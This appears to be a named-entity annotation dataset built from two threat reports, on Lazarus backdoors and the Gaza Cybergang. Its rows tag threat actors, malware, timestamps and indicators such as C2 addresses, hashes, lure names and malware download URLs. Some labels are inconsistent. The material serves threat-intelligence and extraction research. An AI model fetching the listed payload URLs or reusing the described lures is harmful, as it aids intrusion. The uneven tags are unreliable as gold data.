these actions could be quite damaging to targets.

Figure 3: The first step of decryption will perform XOR on one byte using the previous
adjacent byte, starting from the last byte and excluding the first byte

Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step
as the RC4 key

3/5



Figure 5: Encrypted (Top) and decrypted (bottom) configuration file

It is also important to note that while the loader component and the configuration file are
located in the same directory (%windows%\system32), the encrypted backdoor is located
in a different directory (%Program Files%\Common Files\System\ado). This complex setup
makes it harder to detect and remove all the backdoors, and is more effective at hiding any
activities.

The complexity and the capabilities of these backdoors present a tough problem for the
targeted organizations. It is a sophisticated attack that needs equally sophisticated
security solutions.

",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro,org
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," Solutions

The ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lazarus,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," group is an experienced organization, methodically evolving their tools and
experimenting with strategies to get past an organization’s defenses. The backdoors they
are deploying are difficult to detect and a significant threat to the privacy and security of
enterprises, allowing attackers to steal information, delete files, install malware, and more.

These and other tools used by the ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lazarus,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," group can be mitigated by routinely scanning
the network for any malicious activity to help prevent the malware from entering and
spreading through an organization. In addition, educating employees and other key people
in an organization on social engineering techniques can allow them to identify what to look
out for when it comes to malicious attacks.

Other mitigation strategies include a multilayered approach to securing the organization’s
perimeter, which includes hardening the endpoints and employing application control to
help prevent malicious applications and processes from being executed.

4/5

https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/keep-an-eye-out-for-these-social-engineering-scams
http://blog.trendmicro.com/ensuring-comprehensive-endpoint-security/
https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint/endpoint-application-control.html


",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro,org
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, endpoint solutions such as ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro™ Smart Protection,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," Suites and Worry-
Free™ Business Security can protect users and businesses from these threats by detecting
malicious files and spammed messages as well as blocking all related malicious URLs.
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro Deep Discovery,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"™ has an email inspection layer that can protect enterprises by
detecting malicious attachments and URLs that could lead to malicious downloads.

",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro XGen™,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," security provides a cross-generational blend of threat defense
techniques to protect systems from all types of threats. It features high-fidelity machine
learning on gateways and endpoints, and protects physical, virtual, and cloud workloads.
With capabilities like web/URL filtering, behavioral analysis, and custom sandboxing, ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,XGen,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"
security protects against today’s threats that bypass traditional controls; exploit known,
unknown, or undisclosed vulnerabilities; either steal or encrypt personally identifiable data;
or conduct malicious cryptocurrency mining. Smart, optimized, and connected, ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,XGen,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"
security powers ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro,org
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,’s suite of security solutions: ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Hybrid Cloud Security,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,",
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,User Protection,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,", and ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Network Defense,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,".

Indicators of Compromise

Command and Control Servers
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,107[.]172[.]195[.]20,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,192[.]3[.]12[.]154,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,46[.]21[.]147[.]161,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"

5/5

http://www.trendmicro.com/us/business/complete-user-protection/index.html
http://www.trendmicro.com/us/small-business/product-security/
http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/
https://www.trendmicro.com/en_us/business/products/all-solutions.html
https://www.trendmicro.com/vinfo/us/security/definition/machine-learning
http://www.trendmicro.com/us/business/complete-user-protection/index.html
http://www.trendmicro.com/us/enterprise/product-security/vulnerability-protection/
https://www.trendmicro.com/en_us/business/products/hybrid-cloud/deep-security-for-cloud.html
https://www.trendmicro.com/en_us/business/products/user-protection.html
https://www.trendmicro.com/en_us/business/products/network.html

	",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lazarus,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," Continues Heists, Mounts Attacks on Financial Organizations in ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Latin America,country
Gaza Cybergang - updated activity in 2017_ - Securelist,"1. Summary information
The ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist," is an Arabic-language, politically-motivated

cybercriminal group, operating ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,since 2012,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist," and actively targeting the

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,MENA,country
Gaza Cybergang - updated activity in 2017_ - Securelist, (,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Middle East North Africa,country
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,O
Gaza Cybergang - updated activity in 2017_ - Securelist,"’s attacks

have never slowed down and its typical targets include government

entities/embassies, ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,oil,industry
Gaza Cybergang - updated activity in 2017_ - Securelist, and ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,gas,industry
Gaza Cybergang - updated activity in 2017_ - Securelist,", ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,media/press,industry
Gaza Cybergang - updated activity in 2017_ - Securelist,", activists, politicians, and

diplomats.

One of the interesting new facts, uncovered in ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,mid-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,", is its discovery

inside an oil and gas organization in the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,MENA,country
Gaza Cybergang - updated activity in 2017_ - Securelist," region, infiltrating systems

and pilfering data, apparently ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,for more than a year,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,".

Another interesting finding is the use of the recently discovered ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,CVE-2017-0199,O
Gaza Cybergang - updated activity in 2017_ - Securelist," vulnerability, and ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Microsoft Access,software
Gaza Cybergang - updated activity in 2017_ - Securelist," files into which the

download scripts were embedded to reduce the likelihood of their

detection. Traces of mobile malware that started to appear from ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,late April 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,", are also being investigated.

Recent targets for the group seem to be varied in nature; the attackers do

not appear to be choosing targets selectively, but rather seeking different

kinds of ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,MENA,country
Gaza Cybergang - updated activity in 2017_ - Securelist," intelligence.

Some of the interesting new updates about the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist,":

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist," attackers have continued their interest in

government entities in ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,MENA,country
Gaza Cybergang - updated activity in 2017_ - Securelist,"

New targets identified include oil and gas in ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,MENA,country
Gaza Cybergang - updated activity in 2017_ - Securelist,"

New tools and techniques include

Abuse of the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,CVE 2017-0199,O
Gaza Cybergang - updated activity in 2017_ - Securelist," vulnerability

Usage of macros inside ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Microsoft Access,software
Gaza Cybergang - updated activity in 2017_ - Securelist," files, enabling lower

detection rates

Possible ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Android mobile malware,malware
Gaza Cybergang - updated activity in 2017_ - Securelist," being used by attackers

Previous published research: 

https://securelist.com/gaza-cybergang-wheres-your-ir-team/72283/

updated activity in
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,":
New targets, use of ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,MS Access,software
Gaza Cybergang - updated activity in 2017_ - Securelist,"
Macros and ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,CVE 2017-0199,O
Gaza Cybergang - updated activity in 2017_ - Securelist,", and
possible mobile espionage

By ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,GReAT,org
Gaza Cybergang - updated activity in 2017_ - Securelist, on ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,"October 30, 2017. 9:00 am",timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

https://securelist.com/gaza-cybergang-wheres-your-ir-team/72283/
https://securelist.com/author/great/


",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Kaspersky Lab,org
Gaza Cybergang - updated activity in 2017_ - Securelist, products and services successfully detect and block ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist," attacks, detection names below:

HEUR:",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Exploit.MSOffice.Generic,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

HEUR:",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Trojan.Win32.Cometer.gen,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

HEUR:",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Trojan.Win32.Generic,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Trojan-Downloader.Win32.Downeks,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Trojan-Spy.MSIL.Downeks,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Win32.Bublik,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Win32.Agentb,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

More information about ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist," is available to customers of the

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Kaspersky Intelligence Reporting Service,org
Gaza Cybergang - updated activity in 2017_ - Securelist,". Contact:

intelreports@kaspersky.com

2. Technical details
Previously, ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist," attacks were surprisingly successful in using

simple and common tools to achieve their goals. They relied on a variety

of ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Remote Access Trojans,malware
Gaza Cybergang - updated activity in 2017_ - Securelist, (,O
Gaza Cybergang - updated activity in 2017_ - Securelist,RATs,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,") to perform their activities, including

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Downeks,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,", ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Qasar,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,", ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Cobaltstrike,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"…

As recently as ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,June 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,", however, the attackers started using the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,CVE 2017-0199,O
Gaza Cybergang - updated activity in 2017_ - Securelist," vulnerability which enables direct code execution from a

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Microsoft office,software
Gaza Cybergang - updated activity in 2017_ - Securelist, document on non-patched victim systems (,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Cobaltstrike,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

payload in this case). Another finding is a possible ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Android Trojan,malware
Gaza Cybergang - updated activity in 2017_ - Securelist," that the

attackers positioned on one of their command servers in ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,April 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,".

In most cases, malware is sent by email as a compressed attachment or

download links. Starting from ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,March 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,", we have observed

downloaders or ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Microsoft office,software
Gaza Cybergang - updated activity in 2017_ - Securelist," documents with embedded macros

being sent to victims. When opened, the downloader would contact a

URL or IP address to retrieve the actual payload. Once successfully

executed, the malware grants full access to the attackers, providing them

with the ability to collect files, keystrokes and screenshots from victims’

devices. If the initial downloaded malware was detected by the victim, the

downloader would attempt to retrieve other malware files to the victim’s

device, in the hope that one of those files would work.

The full list of indicators of compromise (IOCs) can be found in Appendix

I. The list of the most interesting lure content, malware files and related

droppers, and command servers can be found in Appendix II.

3. Summary of recent
campaigns

mailto:intelreports@kaspersky.com


Below can be found the list of recent findings related to ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist,"

operations:

Command and

control server
Hash First seen

File name/Social

engineering lure

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,upgrade.newshelpyou[.]com,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,552796e71f7ff304f91b39f5da46499b,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,25-07-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist," nvStView.exe

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,6fba58b9f9496cc52e78379de9f7f24e,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,23-03-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

 exe.صور خاصة
(Translation:

Special photos)

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,eb521caebcf03df561443194c37911a5,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,03-04-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

 exe.صور خاصة
(Translation:

Special photos)

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,moreoffer[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,66f144be4d4ef9c83bea528a4cd3baf3,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,27-05-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

تصريح ألمير قطر واتهام
اإلمارات في اختراق وكالة

 exe.األنباء
(Translation: A

statement by the

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Emir of Qatar,identity
Gaza Cybergang - updated activity in 2017_ - Securelist,"

accusing the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,UAE,country
Gaza Cybergang - updated activity in 2017_ - Securelist,"

of breaking the

news agency)

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,3ff60c100b67697163291690e0c2c2b7,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"



",O
Gaza Cybergang - updated activity in 2017_ - Securelist,11-05-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,MOM.InstallProxy.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,b7390bc8c8a9a71a69ce4cc0c928153b,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"



",O
Gaza Cybergang - updated activity in 2017_ - Securelist,05-04-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

تعرف على المنقبة التي
 أساءت للسعودية

(Translation: Learn

about the woman

wearing niqab

which offended

Saudi)

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,f43188accfb6923d62fe265d6d9c0940,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"



",O
Gaza Cybergang - updated activity in 2017_ - Securelist,21-03-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist, ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gcc-Ksa-uae.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,056d83c1c1b5f905d18b3c5d58ff5342,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,16-03-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

مراسلة بخصوص اجتماع
 exe.رؤساء البعثات
(Translation:

Correspondence

regarding the

meeting of ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Heads of Missions,org
Gaza Cybergang - updated activity in 2017_ - Securelist,")

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,138.68.242[.]68,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist, ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,87a67371770fda4c2650564cbb00934d,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"



",O
Gaza Cybergang - updated activity in 2017_ - Securelist,20-06-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist, ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,hamas.doc,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

نقاط اتفاق حماس وتيار فتح
doc.االصالحي

(Translation: the

points of

agreement

between ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Hamas,org
Gaza Cybergang - updated activity in 2017_ - Securelist,"

and the reformist

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Fateh movement,org
Gaza Cybergang - updated activity in 2017_ - Securelist,") 

محضر اجتماع مركزية فتح
doc.الليلة

(Translation:

minutes of the



tonight meeting) 

سلفة أم راتب للموظفين يوم
doc.الثالثاء المقبل؟

(Translation: An

advance on salary

or full salary for

employees ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,next Tuesday,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"?)

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,lol.mynetav[.]org,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,4f3b1a2088e473c7d2373849deb4536f,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,20-06-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Notepad.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,attachment.scr,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,signup.updatesforme[.]club,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7d3426d8eb70e4486e803afb3eeac14f,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,04-05-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Palestinian Retirement Authority Ramallah.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,0ee4757ab9040a95e035a667457e4bc6,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,27-04-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,27-4-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist, ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Fateh,org
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza plo.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,ping.topsite[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,b68fcf8feb35a00362758fc0f92f7c2e,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,19-03-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Downloaded by

Macro in MDB

files: 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,http://download.data-server.cloudns[.]club/indexer.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7bef124131ffc2ef3db349b980e52847,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,13-03-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

األخ اسماعيل هنية -نائب
رئيس المكتب السياسي

.exe 

(Translation:

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Brother Ismail Haniyeh,identity
Gaza Cybergang - updated activity in 2017_ - Securelist, – Deputy Head of the ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Political Bureau,org
Gaza Cybergang - updated activity in 2017_ - Securelist,")

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,d87c872869023911494305ef4acbd966,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,19-03-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Downloaded by

Macro in MDB

files:

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,http://download.data-server.cloudns[.]club/wordindexer.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,a3de096598e3c9c8f3ab194edc4caa76,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,12-04-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist, ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,viewimages.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,c078743eac33df15af2d9a4f24159500,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,28-03-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist, ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,viewimages.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,70d03e34cadb0f1e1bc6f4bf8486e4e8,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,30-03-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist, ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,download-file.duckdns[.]org/send/Egyptian_agreement_with_President_Mahmoud_Abbas.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,67f48fd24bae3e63b29edccc524f4096,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,17-04-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,http://alasra-paper.duckdns[.]org/send/رسالة_وفد_الرئيسابومازن_لحماس_فيrar,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,".قطاع_غزة

(Message from President ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Abu Mazen,identity
Gaza Cybergang - updated activity in 2017_ - Securelist, to ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Hamas,org
Gaza Cybergang - updated activity in 2017_ - Securelist, in ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza Strip,country
Gaza Cybergang - updated activity in 2017_ - Securelist,")

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7b536c348a21c309605fa2cd2860a41d,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,17-04-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,http://alasra-paper.duckdns[.]org/send/ورقة_االسرى_المقدمة_لف rar,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,". ك_االضراب
(Translation:

captives paper

submitted to stop

the strike)

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,alasra-paper.duckdns[.]org,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Mobile malware,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

N/A
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,23-04-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Possible ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Android malware,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,".

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,http://alasra-paper.duckdns[.]org/send/%D9%88%ket-Edition-1.04_ApkHouse.com/Dont-Starve-Pocket-Edition-1.04_ApkHouse.com.apk,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,hamas-wathaq.duckdns[.]org,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,cf9d89061917e9f48481db80e674f0e9,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,16-04-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

وثائق تنشر ألول مره عن
حكم حماس لقطاع غزه

.exe 

(Translation: Documents published for the first time on ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Hamas,org
Gaza Cybergang - updated activity in 2017_ - Securelist, ruling of ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza Strip,country
Gaza Cybergang - updated activity in 2017_ - Securelist,")

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,manual.newphoneapp[.]com,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,86a89693a273d6962825cf1846c3b6ce,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,02-02-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,SQLiteDatabaseBrowserPortable.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,3f67231f30fa742138e713085e1279a6,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"
",O
